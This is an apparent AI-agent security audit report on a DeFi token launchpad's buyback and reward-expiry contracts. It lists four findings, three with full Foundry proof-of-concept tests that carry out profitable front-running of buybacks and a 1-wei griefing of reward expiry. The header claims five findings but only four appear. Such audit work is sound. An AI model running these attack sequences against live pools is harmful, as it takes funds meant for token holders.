# Audit report

> Project: PepesFamily launchpad v4, re-check after audit ec4e3ea7
> Repo: github.com/0xtenang/PepesFamily (commit 2097cf2)
> Scope: contracts/src/PepesFamily.sol, contracts/src/PadToken.sol, contracts/src/PepesBuyback.sol
> Tests: contracts/test/PepesFamily.t.sol, contracts/test/PepesBuyback.t.sol, contracts/test/Fork.t.sol
>
> Changes since ec4e3ea7
>
> Finding 1: PepesBuyback adds a price guard. It records the pool sqrtPrice after each buyback (at deployment before the first) and only buys while the $PEPES price is ≤ 2% above it + 2% per day elapsed (priceRiseBps, allowedPriceRiseBps). Your proof scenario is test_pacedFrontRunStallsTheBuyback.
> Finding 2: burns the whole $PEPES balance.
> Finding 3: the hook calls PadToken.markActive(trader) on every buy. trader is the router-reported user when sender == router, otherwise tx.origin. The pad is the only caller allowed. A transfer the recipient didn't start counts as activity only if amount × 10 ≥ recipient's prior balance. ACTIVITY_MIN is removed.
> Finding 5: the buyback constructor resolves the $PEPES pool through pepesRouter.pad().poolKey(pepes) and requires an initialised IMD/$PEPES pair. Otherwise it reverts with BadWiring.
> Findings 4, 6, 7: comments and README corrected, and tests added.
> Please check
>
> Can the price guard be gamed? For example: pushing the price down before a buyback to set a low reference, stalling buybacks forever (griefing), or a profitable series within the 2%/day allowance.
> Is using tx.origin in markActive safe? Can anyone make a buy mark another wallet active? Any problem with markActive being called during afterSwap?
> Does the 1/10-of-balance gift rule have edge cases (self-transfers, transfers from excluded accounts, first receipts)?
> Did any fix break v3 guarantees or the earlier findings?

| | |
|---|---|
| Repository | https://github.com/0xtenang/PepesFamily.git |
| Commit | `2097cf2d952521d12b39a4b8148ed269345222ba` |
| Job | `b803125e-4ee8-464e-9328-ef7c6e1b9a9d` |
| Judged | 2026-10-06 12:57 UTC |
| Findings | 2 medium · 3 low |

Four agents audited the code as it is at `2097cf2`, each in one area (math, permissions, economics, control flow),
and a judge reproduced, merged and ranked what they found, then read the code once more itself. Nothing in the repository was changed or deployed.

## Findings

### 1. Medium: Price guard re-anchors the reference at every buyback, so a buy of up to 1% of depth before each hourly buyback is never blocked and the series is front-run for profit

`contracts/src/PepesBuyback.sol:132`

```
        refSqrtPrice = _sqrtPrice();
```

Merged from audit_permissions 26b528a9 (a), audit_flow 667249a1, audit_math 408f0b6c and audit_economics 29baf4b5; all four reproduce.

After every successful buyback, lines 132-133 set `refSqrtPrice` to the pool's spot price AFTER the buyback and restart `refTime`. The guard at line 118 therefore bounds the rise since the PREVIOUS buyback (200 bps + 8 bps for the hour), not the rise over the series. Any third-party buy that stays under that per-interval allowance is folded into the next reference in full, together with the buyback's own ~1.9% impact. The notice (lines 33-36) and the README say a pump stalls the series; in fact the guard tolerates about 2% of third-party rise per hour (about 60%/day compounded).

Attack: before each hourly `buybackAndBurnPepes` the attacker buys `maxBuyback()` (1% of depth, +1.93% price, inside the 208 bps allowed after one hour), calls the buyback in the same transaction, and repeats while the reserve lasts; then sells everything into the price the series built. Each buyback injects 0.96% of depth and lifts the price ~1.93%; a round trip costs 8.2% in hook fees, so break-even is around 5-8 buybacks and everything beyond is taken out of the IMD the buybacks spend. A passive variant also pays: one buy of 1% of depth before an 8-buyback series ends +0.78 IMD (audit_flow proof), because the rider never trades again and `priceRiseBps()` reads 0 at every call; that residual is inherent to any flat 2% band around a public buy series and only a slower pace removes it, but the paced form above is what the re-anchoring adds.

Who loses: the expired holder rewards the buyback is meant to spend on burning $PEPES. Measured on the repository's own guard-test pool (depth 1,061.9 IMD): 24 of 24 hourly buybacks run, 337.1 IMD spent, attacker +44.9 IMD (13.3% of the spend); audit_permissions measured +16.5 IMD on 17 buybacks with a depth/5 reserve; audit_economics reports +210.4 IMD on a local fork of the live pool (depth 4,974.6 IMD). A reserve of a third of depth is realistic: recycle() is permissionless, so the attacker can let expired rewards pile up and recycle them in one go.

Existing tests do not cover it: `test_pacedFrontRunStallsTheBuyback` buys once (40% of depth) before the first buyback; no test trades between two buybacks.

Fix (design decision for the requester, both keep the hourly pace and the organic-rise behaviour): stop absorbing third-party rises at each buyback. Set the new reference to the old reference scaled by the buyback's OWN move only (`ref * sqrtAfter / sqrtBefore`, with `sqrtBefore` read just before `pepesRouter.buy`), never above the current price, and keep the flat 2% band plus the 2%/day drift above it. audit_economics and audit_permissions both validated this on a copy of the tree: the hourly-ratchet proof passes (attacker loses ~22 IMD) and PepesBuyback.t.sol and PepesFamily.t.sol still pass. A 24h TWAP from the pool's own observations is the alternative. Note this fix alone does NOT close the idle-allowance finding below.

**Reproduction**

State: test/PepesBuyback.t.sol setUp (launchpad A's $Pepes pool after bob's 1,000 IMD buy, depth 1,061.9 IMD; launchpad B's PepesBuyback wired to it), reserve = 40% of depth, one buyback run so the reference is fresh.
Steps: every hour for 24 hours eve (1) `routerA.buy(pepes, buyback.maxBuyback(), 0, now)` then (2) `buyback.buybackAndBurnPepes(0, now)`; after hour 24 she sells everything she bought.
Expected (notice lines 33-36, README price-guard paragraph, the property `test_pacedFrontRunStallsTheBuyback` asserts): the buybacks stall with `PriceRisen`, and eve ends with no more IMD than she started with.
Actual: `priceRiseBps() <= allowedPriceRiseBps()` at every call, 24 of 24 buybacks run, 337.07 IMD spent, eve 10,000 -> 10,044.92 IMD.
Run: `cd contracts && forge test --match-path test/scratch/Proof_29baf4b559f6.t.sol -vv` fails with "front-running the paced buyback must not be profitable: 10044917259745802076753 > 10000000000000000000000". Variant (audit_flow proof, also run): a single 1%-of-depth buy before an 8-buyback series, eve 10,000 -> 10,000.78 IMD.

**Proof**: a Foundry test that fails on this code and passes once it is fixed.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test} from "forge-std/Test.sol";
import {PoolManager} from "v4-core/src/PoolManager.sol";
import {IHooks} from "v4-core/src/interfaces/IHooks.sol";
import {TickMath} from "v4-core/src/libraries/TickMath.sol";
import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {Currency} from "v4-core/src/types/Currency.sol";

import {PepesFamily} from "src/PepesFamily.sol";
import {PepesFamilyRouter} from "src/PepesFamilyRouter.sol";
import {PepesBuyback} from "src/PepesBuyback.sol";
import {PadToken} from "src/PadToken.sol";

contract MockIMD {
    string public name = "Identity.md";
    string public symbol = "IMD";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address s, uint256 amt) external returns (bool) {
        allowance[msg.sender][s] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address f, address to, uint256 amt) external returns (bool) {
        if (allowance[f][msg.sender] != type(uint256).max) allowance[f][msg.sender] -= amt;
        balanceOf[f] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Launchpad A needs a wired buyback of its own (never used here): this reports an initialised IMD pair.
contract WiringStub {
    PoolKey internal key;

    function setKey(PoolKey memory k) external {
        key = k;
    }

    function pad() external view returns (address) {
        return address(this);
    }

    function poolKey(address) external view returns (PoolKey memory) {
        return key;
    }
}

/// @notice IMD Swarm re-check of audit ec4e3ea7, finding 1 (paced buyback front-run).
///         Same world as test/PepesBuyback.t.sol: "$Pepes" is a token launched on launchpad A (4% hook fee,
///         single-sided curve, like the live v1 $Pepes pool); launchpad B's PepesBuyback buys it through A's router.
///         No idle time here: the reference is fresh. Each buyback re-anchors the reference at its own post-buyback
///         price, so the guard only limits the rise since the PREVIOUS buyback. Eve buys as much as the buyback
///         itself (1% of depth, about +1.9% in price) before every hourly buyback and is never blocked; after a day
///         she sells everything at a profit taken out of the IMD the buybacks put in.
contract GuardHourlyRatchetTest is Test {
    uint160 constant HOOK_FLAGS = 0x28CC;
    int24 constant START_TICK = 161_000; // ~100 IMD starting market cap

    PoolManager pm;
    MockIMD imd;
    PepesFamilyRouter routerA;
    PadToken pepes;
    PepesBuyback buyback;

    address eve = makeAddr("eve");
    address bob = makeAddr("bob");

    function setUp() public {
        vm.warp(1_800_000_000);
        pm = new PoolManager(address(this));
        imd = new MockIMD();

        WiringStub stub = new WiringStub();
        (address c0, address c1) =
            address(stub) < address(imd) ? (address(stub), address(imd)) : (address(imd), address(stub));
        PoolKey memory k = PoolKey(Currency.wrap(c0), Currency.wrap(c1), 3000, 60, IHooks(address(0)));
        pm.initialize(k, TickMath.getSqrtPriceAtTick(0));
        stub.setKey(k);

        PepesFamily padA = _deployPad(address(stub), address(stub));
        routerA = PepesFamilyRouter(payable(padA.router()));
        pepes = PadToken(payable(padA.launch("Pepes", "PEPES", "", address(imd))));
        // a $Pepes pool with some depth: bob bought in earlier
        imd.mint(bob, 1_000e18);
        vm.startPrank(bob);
        imd.approve(address(routerA), type(uint256).max);
        routerA.buy(address(pepes), 1_000e18, 0, vm.getBlockTimestamp());
        vm.stopPrank();

        // the launchpad under review: its buyback buys "$Pepes" through launchpad A's router
        buyback = PepesBuyback(_deployPad(address(pepes), address(routerA)).buyback());

        imd.mint(eve, 10_000e18);
        vm.startPrank(eve);
        imd.approve(address(routerA), type(uint256).max);
        pepes.approve(address(routerA), type(uint256).max);
        vm.stopPrank();
    }

    function _deployPad(address pepes_, address pepesRouter_) internal returns (PepesFamily pad) {
        bytes memory initCode = abi.encodePacked(
            type(PepesFamily).creationCode,
            abi.encode(
                pm,
                address(imd),
                address(this),
                address(this),
                START_TICK,
                PepesFamily.ImdEthPool(10_000, 100, address(0)),
                pepes_,
                pepesRouter_
            )
        );
        bytes32 initCodeHash = keccak256(initCode);
        for (uint256 salt;; salt++) {
            address a = address(
                uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), address(this), bytes32(salt), initCodeHash))))
            );
            if (uint160(a) & 0x3FFF != HOOK_FLAGS) continue;
            assembly {
                pad := create2(0, add(initCode, 0x20), mload(initCode), salt)
            }
            require(address(pad) == a, "hook address");
            return pad;
        }
    }

    function test_toppingUpBeforeEveryHourlyBuybackMustNotPay() public {
        uint256 depth = buyback.maxBuyback() * 100;
        imd.mint(address(buyback), (depth * 40) / 100); // many holders' rewards expired
        // A first buyback now: the reference price and time are as fresh as they can be.
        buyback.buybackAndBurnPepes(0, vm.getBlockTimestamp());
        uint256 start = imd.balanceOf(eve);

        vm.startPrank(eve);
        uint256 bought;
        uint256 runs;
        for (uint256 h; h < 24; h++) {
            vm.warp(vm.getBlockTimestamp() + 1 hours);
            // +1% of depth moves the price about +1.9%: inside the 2% the guard tolerates since the last buyback
            bought += routerA.buy(address(pepes), buyback.maxBuyback(), 0, vm.getBlockTimestamp());
            try buyback.buybackAndBurnPepes(0, vm.getBlockTimestamp()) {
                runs++;
            } catch {}
        }
        routerA.sell(address(pepes), bought, 0, vm.getBlockTimestamp());
        vm.stopPrank();

        emit log_named_uint("hourly buybacks that ran (of 24)", runs);
        emit log_named_decimal_uint("pool depth at the start (IMD)", depth, 18);
        emit log_named_decimal_uint("IMD the buyback spent", buyback.totalImdSpent(), 18);
        emit log_named_decimal_uint("eve's IMD before", start, 18);
        emit log_named_decimal_uint("eve's IMD after ", imd.balanceOf(eve), 18);
        assertLe(imd.balanceOf(eve), start, "front-running the paced buyback must not be profitable");
    }
}
```

### 2. Medium: Price guard allowance grows 2%/day without bound while no buyback runs, so after an idle period a one-block pump passes the guard and the original front-run pays again

`contracts/src/PepesBuyback.sol:152`

```
        return MAX_PRICE_RISE_BPS + (PRICE_RISE_PER_DAY_BPS * (block.timestamp - refTime)) / 1 days;
```

Merged from audit_permissions 26b528a9 (b), audit_flow f5f15d87 and audit_economics 9d973ab3; all reproduce.

`allowedPriceRiseBps()` is 200 + 200 x days since `refTime`, with no cap, and `refTime` only moves in the constructor (line 102) and after a SUCCESSFUL buyback (line 133). Every day without a buyback adds 2% of tolerance regardless of what the price did. The buyback is idle by construction: nothing can expire in the first 7 days after a launch (so the first buyback always has >= 16% of room), the reserve is empty between batches of expiries, and expired IMD only arrives when someone calls the permissionless `recycle()`, so the attacker also chooses when the reserve appears. After D idle days a pump of up to 2% + 2% x D in the same block passes line 118; the buyback buys into it (its cap is 1% of the pumped depth), line 132 re-anchors the reference at the pumped price, and every following hourly buyback runs too. This is exactly the scenario of audit ec4e3ea7 finding 1 that the guard was added to stop; `test_pacedFrontRunStallsTheBuyback` only pumps against a reference that is zero seconds old.

Measured on the guard-test pool (depth 1,061.9 IMD): 7 idle days, 8%-of-depth pump: 24/24 buybacks run, attacker +36.7 IMD (11.9% of the spend); 21 days, 20.8%: +87.9 IMD (25.7%); 48 days, 40% (the audit's own pump, +9,154 bps against 9,800 allowed): 8/8 run, +21.5 IMD on 8 buybacks (17.7% of the spend) and +153 IMD over 24. audit_permissions: 30 idle days, 25% pump, +51.3 IMD (24%). The attacker's return on the IMD she puts in is 36-43% in a day; the loser is the expired-rewards pool meant to burn $PEPES, and fewer $PEPES are burned because the buyback paid pumped prices.

Fix (requester's decision, it changes the agreed rule): the allowance must not grow over time in which no price was observed. Cap the accrued term (audit_economics tried a one-day cap on a copy: the proof passes, 0 of 8 buybacks run and the attacker loses 33.3 IMD) and let the reference ratchet toward the market by at most the accrued allowance via an internal `_ratchet()` called at the top of `buybackAndBurnPepes` and from a permissionless `poke()`, so a slow organic rise is still absorbed (audit_permissions validated this: paced series and post-idle pump both blocked, an honest hourly series and a 20% organic rise still run; `test_organicRiseOnlyDelays` then needs pokes during its wait). Until then anyone can keep the allowance from building by running a buyback regularly (1 wei in the reserve is enough), but nothing in the contracts makes that happen. The re-anchoring fix of the previous finding alone leaves this proof failing (8 of 8 run).

**Reproduction**

State: `test_pacedFrontRunStallsTheBuyback` with one line added: `vm.warp(now + 48 days)` before eve buys (last buyback or deployment 48 days ago); depth 1,061.9 IMD; 212.4 IMD (depth/5) reaches the buyback now.
Steps: 1. eve buys $Pepes with 40% of depth (424.76 IMD) through routerA: `priceRiseBps()` = 9,154, `allowedPriceRiseBps()` = 9,800. 2. once an hour for 8 hours anyone calls `buybackAndBurnPepes(0, now)`. 3. eve sells everything.
Expected (notice, README, the existing test's two assertions): `PriceRisen` on every call, 0 buybacks, eve ends with less IMD than she started with.
Actual: 8 of 8 run and spend 121.60 IMD; eve 10,000 -> 10,021.52 IMD.
Run: `cd contracts && forge test --match-path test/scratch/Proof_9d973ab37db8.t.sol -vv` fails with "front-running the paced buyback must not be profitable: 10021521031196906105854 > 10000000000000000000000".

**Proof**: a Foundry test that fails on this code and passes once it is fixed.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test} from "forge-std/Test.sol";
import {PoolManager} from "v4-core/src/PoolManager.sol";
import {IHooks} from "v4-core/src/interfaces/IHooks.sol";
import {TickMath} from "v4-core/src/libraries/TickMath.sol";
import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {Currency} from "v4-core/src/types/Currency.sol";

import {PepesFamily} from "src/PepesFamily.sol";
import {PepesFamilyRouter} from "src/PepesFamilyRouter.sol";
import {PepesBuyback} from "src/PepesBuyback.sol";
import {PadToken} from "src/PadToken.sol";

contract MockIMD {
    string public name = "Identity.md";
    string public symbol = "IMD";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address s, uint256 amt) external returns (bool) {
        allowance[msg.sender][s] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address f, address to, uint256 amt) external returns (bool) {
        if (allowance[f][msg.sender] != type(uint256).max) allowance[f][msg.sender] -= amt;
        balanceOf[f] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Launchpad A needs a wired buyback of its own (never used here): this reports an initialised IMD pair.
contract WiringStub {
    PoolKey internal key;

    function setKey(PoolKey memory k) external {
        key = k;
    }

    function pad() external view returns (address) {
        return address(this);
    }

    function poolKey(address) external view returns (PoolKey memory) {
        return key;
    }
}

/// @notice IMD Swarm re-check of audit ec4e3ea7, finding 1 (paced buyback front-run).
///         Same world as test/PepesBuyback.t.sol: "$Pepes" is a token launched on launchpad A (4% hook fee,
///         single-sided curve, like the live v1 $Pepes pool); launchpad B's PepesBuyback buys it through A's router.
///         The scenario is the audit's proof (`test_pacedFrontRunStallsTheBuyback`) with ONE change: no buyback ran
///         for 48 days before eve arrives. The 2%-per-day allowance kept accruing over those days, so her pump is
///         inside the guard and every hourly buyback buys into it.
contract GuardIdleAllowanceTest is Test {
    uint160 constant HOOK_FLAGS = 0x28CC;
    int24 constant START_TICK = 161_000; // ~100 IMD starting market cap

    PoolManager pm;
    MockIMD imd;
    PepesFamilyRouter routerA;
    PadToken pepes;
    PepesBuyback buyback;

    address eve = makeAddr("eve");
    address bob = makeAddr("bob");

    function setUp() public {
        vm.warp(1_800_000_000);
        pm = new PoolManager(address(this));
        imd = new MockIMD();

        WiringStub stub = new WiringStub();
        (address c0, address c1) =
            address(stub) < address(imd) ? (address(stub), address(imd)) : (address(imd), address(stub));
        PoolKey memory k = PoolKey(Currency.wrap(c0), Currency.wrap(c1), 3000, 60, IHooks(address(0)));
        pm.initialize(k, TickMath.getSqrtPriceAtTick(0));
        stub.setKey(k);

        PepesFamily padA = _deployPad(address(stub), address(stub));
        routerA = PepesFamilyRouter(payable(padA.router()));
        pepes = PadToken(payable(padA.launch("Pepes", "PEPES", "", address(imd))));
        // a $Pepes pool with some depth: bob bought in earlier
        imd.mint(bob, 1_000e18);
        vm.startPrank(bob);
        imd.approve(address(routerA), type(uint256).max);
        routerA.buy(address(pepes), 1_000e18, 0, vm.getBlockTimestamp());
        vm.stopPrank();

        // the launchpad under review: its buyback buys "$Pepes" through launchpad A's router
        buyback = PepesBuyback(_deployPad(address(pepes), address(routerA)).buyback());

        imd.mint(eve, 10_000e18);
        vm.startPrank(eve);
        imd.approve(address(routerA), type(uint256).max);
        pepes.approve(address(routerA), type(uint256).max);
        vm.stopPrank();
    }

    function _deployPad(address pepes_, address pepesRouter_) internal returns (PepesFamily pad) {
        bytes memory initCode = abi.encodePacked(
            type(PepesFamily).creationCode,
            abi.encode(
                pm,
                address(imd),
                address(this),
                address(this),
                START_TICK,
                PepesFamily.ImdEthPool(10_000, 100, address(0)),
                pepes_,
                pepesRouter_
            )
        );
        bytes32 initCodeHash = keccak256(initCode);
        for (uint256 salt;; salt++) {
            address a = address(
                uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), address(this), bytes32(salt), initCodeHash))))
            );
            if (uint160(a) & 0x3FFF != HOOK_FLAGS) continue;
            assembly {
                pad := create2(0, add(initCode, 0x20), mload(initCode), salt)
            }
            require(address(pad) == a, "hook address");
            return pad;
        }
    }

    function test_pacedFrontRunAfterIdlePeriodMustNotPay() public {
        // The only change to the audit's scenario: the last buyback (here: deployment) was 48 days ago. Nothing can
        // expire during the first 7 days after a launch, and the reserve is empty between batches of expiries, so
        // the buyback regularly sits idle; the reference time only moves when a buyback runs.
        vm.warp(vm.getBlockTimestamp() + 48 days);

        uint256 depth = buyback.maxBuyback() * 100;
        imd.mint(address(buyback), depth / 5); // expired rewards arrive now (recycle() is callable by anyone)
        uint256 start = imd.balanceOf(eve);

        vm.startPrank(eve);
        uint256 got = routerA.buy(address(pepes), (depth * 40) / 100, 0, vm.getBlockTimestamp());
        uint256 runs;
        for (uint256 h; h < 8; h++) {
            vm.warp(vm.getBlockTimestamp() + 1 hours);
            try buyback.buybackAndBurnPepes(0, vm.getBlockTimestamp()) {
                runs++;
            } catch {}
        }
        routerA.sell(address(pepes), got, 0, vm.getBlockTimestamp());
        vm.stopPrank();

        emit log_named_uint("buybacks that ran into the pump (of 8)", runs);
        emit log_named_decimal_uint("IMD the buyback spent", buyback.totalImdSpent(), 18);
        emit log_named_decimal_uint("eve's IMD before", start, 18);
        emit log_named_decimal_uint("eve's IMD after ", imd.balanceOf(eve), 18);
        assertLe(imd.balanceOf(eve), start, "front-running the paced buyback must not be profitable");
    }
}
```

### 3. Low: Gift-activity rule is free against a zero or dust balance: a 1-wei transfer keeps an exited holder's unclaimed rewards from ever expiring

`contracts/src/PadToken.sol:236`

```
                            || amount * GIFT_ACTIVITY_DIVISOR >= balanceOf[to] - amount
```

Merged from audit_permissions 4293024b, audit_flow f67d3f03, audit_math bbb61c7d and audit_economics 11fee012; all reproduce.

A receipt the recipient did not start counts as activity when `amount * 10 >= balanceOf[to] - amount`, i.e. a tenth of the recipient's PRIOR balance. The constant's notice (lines 51-53) and the README promise that holding off someone's expiry costs a tenth of their bag whatever the token's price. For the wallets most likely to leave rewards unclaimed, those that sold everything (the case `test_expiry_zeroBalanceHolderLosesEverythingOld` covers: the router's sell path leaves accrued rewards withdrawable), the prior balance is 0 and `1 * 10 >= 0` holds, so a 1-wei gift resets the 7-day timer. It stays true for 1 wei until the balance reaches 10 wei, then for 2 wei, and so on: over 52 weekly gifts the total cost is under 1,000 wei of the token. The same applies to any holder whose bag is dust next to their rewards. This is a regression for these wallets of the finding-3 fix: before it a gift had to be at least 10,000 tokens (`ACTIVITY_MIN`) to count.

Impact: anyone can keep arbitrary exited wallets' rewards away from the buyback for gas plus dust; the rewards remain claimable by their owner, nothing is stolen, so low.

The other edge cases asked about hold: a self-transfer marks the sender anyway and `balanceOf[to] - amount` cannot underflow (the balance was just raised by `amount`; for from == to it is unchanged); a transfer from an excluded account (the PoolManager paying out a buy) marks nobody as sender and leaves the recipient to this rule, the hook marking the buyer separately; a first receipt starts the timer once; a zero-amount transfer never counts; `amount * 10` cannot overflow with a 1e27 supply.

Fix: put an absolute floor next to the relative one (`amount * GIFT_ACTIVITY_DIVISOR >= prior && amount >= MIN_GIFT`, audit_economics validated a 1-token floor on a copy with all 56 PepesFamily tests passing; keep it small since finding 3 was about a fixed 10,000-token floor being wrong at high prices), or do not count gifts at all once `lastActive` is set, now that the hook records buys of any size.

**Reproduction**

State: bob buys a v4 token for 100 IMD, carol's 500 IMD buy pays him a holder reward, bob sells his whole bag the same day: `balanceOf(bob) == 0`, `lastActive[bob]` = day 0, 18.0 IMD unclaimed.
Steps: day 6 carol calls `token.transfer(bob, 1)` (1 wei); day 7 + 1 s anyone calls `token.recycle(bob)`.
Expected (README and the constant's notice): `lastActive[bob]` stays day 0, `expiredRewardsOf(bob)` = 18.0 IMD and `recycle` sends it to the buyback.
Actual: `lastActive[bob]` = day 6 (1800518400), `expiredRewardsOf(bob)` = 0, `recycle(bob)` moves nothing; repeating the gift weekly keeps it so indefinitely.
Run: `cd contracts && forge test --match-path test/scratch/Proof_11fee012a19e.t.sol -vv` fails with "a 1-wei gift is not bob's activity: 1800518400 != 1800000000".

**Proof**: a Foundry test that fails on this code and passes once it is fixed.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test} from "forge-std/Test.sol";
import {PoolManager} from "v4-core/src/PoolManager.sol";
import {IHooks} from "v4-core/src/interfaces/IHooks.sol";
import {TickMath} from "v4-core/src/libraries/TickMath.sol";
import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {Currency} from "v4-core/src/types/Currency.sol";

import {PepesFamily} from "src/PepesFamily.sol";
import {PepesFamilyRouter} from "src/PepesFamilyRouter.sol";
import {PadToken} from "src/PadToken.sol";

contract MockIMD {
    string public name = "Identity.md";
    string public symbol = "IMD";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address s, uint256 amt) external returns (bool) {
        allowance[msg.sender][s] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address f, address to, uint256 amt) external returns (bool) {
        if (allowance[f][msg.sender] != type(uint256).max) allowance[f][msg.sender] -= amt;
        balanceOf[f] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev The launchpad needs a wired buyback (never used here): this reports an initialised IMD pair.
contract WiringStub {
    PoolKey internal key;

    function setKey(PoolKey memory k) external {
        key = k;
    }

    function pad() external view returns (address) {
        return address(this);
    }

    function poolKey(address) external view returns (PoolKey memory) {
        return key;
    }
}

/// @notice IMD Swarm re-check of audit ec4e3ea7, finding 3 (activity): the 1/10-of-balance gift rule.
///         "Holding off someone's expiry costs a tenth of their bag each time" - a tenth of nothing is nothing. For a
///         wallet that sold everything (the wallets `test_expiry_zeroBalanceHolderLosesEverythingOld` is about),
///         `amount * 10 >= balanceOf[to] - amount` is true for 1 wei, so anyone resets its 7-day timer for free.
contract GiftRuleZeroBalanceTest is Test {
    uint160 constant HOOK_FLAGS = 0x28CC;
    int24 constant START_TICK = 161_000; // ~100 IMD starting market cap

    PoolManager pm;
    MockIMD imd;
    PepesFamily pad;
    PepesFamilyRouter router;
    PadToken token;

    address bob = makeAddr("bob");
    address carol = makeAddr("carol");

    function setUp() public {
        vm.warp(1_800_000_000);
        pm = new PoolManager(address(this));
        imd = new MockIMD();

        WiringStub stub = new WiringStub();
        (address c0, address c1) =
            address(stub) < address(imd) ? (address(stub), address(imd)) : (address(imd), address(stub));
        PoolKey memory k = PoolKey(Currency.wrap(c0), Currency.wrap(c1), 3000, 60, IHooks(address(0)));
        pm.initialize(k, TickMath.getSqrtPriceAtTick(0));
        stub.setKey(k);

        pad = _deployPad(address(stub), address(stub));
        router = PepesFamilyRouter(payable(pad.router()));
        token = PadToken(payable(pad.launch("Test", "TST", "", address(imd))));

        address[2] memory users = [bob, carol];
        for (uint256 i; i < users.length; i++) {
            imd.mint(users[i], 10_000e18);
            vm.startPrank(users[i]);
            imd.approve(address(router), type(uint256).max);
            token.approve(address(router), type(uint256).max);
            vm.stopPrank();
        }
    }

    function _deployPad(address pepes_, address pepesRouter_) internal returns (PepesFamily p) {
        bytes memory initCode = abi.encodePacked(
            type(PepesFamily).creationCode,
            abi.encode(
                pm,
                address(imd),
                address(this),
                address(this),
                START_TICK,
                PepesFamily.ImdEthPool(10_000, 100, address(0)),
                pepes_,
                pepesRouter_
            )
        );
        bytes32 initCodeHash = keccak256(initCode);
        for (uint256 salt;; salt++) {
            address a = address(
                uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), address(this), bytes32(salt), initCodeHash))))
            );
            if (uint160(a) & 0x3FFF != HOOK_FLAGS) continue;
            assembly {
                p := create2(0, add(initCode, 0x20), mload(initCode), salt)
            }
            require(address(p) == a, "hook address");
            return p;
        }
    }

    function test_oneWeiGiftMustNotHoldOffAnExitedHoldersExpiry() public {
        uint256 t0 = vm.getBlockTimestamp();
        // day 0: bob buys, carol's buy pays him a holder reward, bob sells everything (his last own act)
        vm.prank(bob);
        uint256 bag = router.buy(address(token), 100e18, 0, t0);
        vm.prank(carol);
        router.buy(address(token), 500e18, 0, t0);
        vm.prank(bob);
        router.sell(address(token), bag, 0, t0);
        assertEq(token.balanceOf(bob), 0);
        uint256 owed = token.withdrawableDividendOf(bob);
        assertGt(owed, 1e18, "bob left more than 1 IMD unclaimed");
        assertEq(token.lastActive(bob), t0);

        // day 6: carol sends bob 1 wei of the token (10^-18 of one token)
        vm.warp(t0 + 6 days);
        vm.prank(carol);
        token.transfer(bob, 1);

        // 7 days and 1 second after bob's last own act: everything he left unclaimed has expired
        vm.warp(t0 + 7 days + 1);
        emit log_named_decimal_uint("IMD bob left unclaimed          ", owed, 18);
        emit log_named_decimal_uint("expired after the 1-wei gift    ", token.expiredRewardsOf(bob), 18);
        assertEq(token.lastActive(bob), t0, "a 1-wei gift is not bob's activity");
        assertEq(token.expiredRewardsOf(bob), owed, "a 1-wei gift must not hold off the expiry");
    }
}
```

### 4. Low: afterSwap credits tx.origin for every router but PepesFamilyRouter, including the pad's own ETH router, so a contract wallet's buy marks its signer and the wallet's rewards still expire

`contracts/src/PepesFamily.sol:353`

```
        address trader = sender == router && hookData.length == 32 ? abi.decode(hookData, (address)) : tx.origin;
```

Merged from audit_permissions ceb98093, audit_flow 5f91d1b2, audit_math cba47f1e and audit_economics d0933366; all reproduce.

The hook trusts hookData only when the PoolManager's `sender` is PepesFamilyRouter; every other buy is attributed to `tx.origin`. PepesFamilyEthRouter is deployed by the launchpad itself and is what the website uses for ETH payments: it knows its buyer (`r.user`, who receives the tokens) but passes empty hookData on the token leg (PepesFamilyEthRouter.sol:178) and is not recognised here, so its buys fall to `tx.origin` like any third-party router's. `tx.origin` is the buyer only for an EOA signing its own transaction. For a Safe or ERC-4337 account (an owner key or bundler signs), a sponsored or relayed transaction, or any contract that buys for itself, `markActive` stamps an address that receives nothing, and the actual holder is left to the receipt rule in `PadToken._transfer`: first receipt, or at least a tenth of its bag. A top-up below a tenth of the bag therefore does not count and anyone can `recycle()` the buyer's rewards a week after its first buy although it bought since. The mirror case exists: a contract that calls PepesFamilyRouter for a user is recorded instead of the user. PadToken's notice (lines 17-18: buys of any amount through any router count), the README and the `markActive` NatSpec ('the transaction's signer, which nobody can set for someone else') all assume buyer == tx.origin. Before the finding-3 fix a receipt of >= 10,000 tokens counted whatever the router or signer; moving buy detection into the hook left these buyers out.

On the brief's other questions: nobody can make a buy mark a wallet that neither signed nor called (hookData is trusted only from PepesFamilyRouter, which encodes its own msg.sender), and a mark can only postpone the marked wallet's expiry. `markActive` is one storage write guarded by `msg.sender == pad`, makes no external call and cannot revert a buy, so calling it inside `afterSwap` adds no reentrancy or liveness problem. The defect is only the wrong wallet being credited.

No test covers a buyer that is not the signer: `test_expiry_externalRouterBuyCountsForTheSigner` pranks bob as both sender and origin, and the ETH router is only exercised by fork tests that never read `lastActive`.

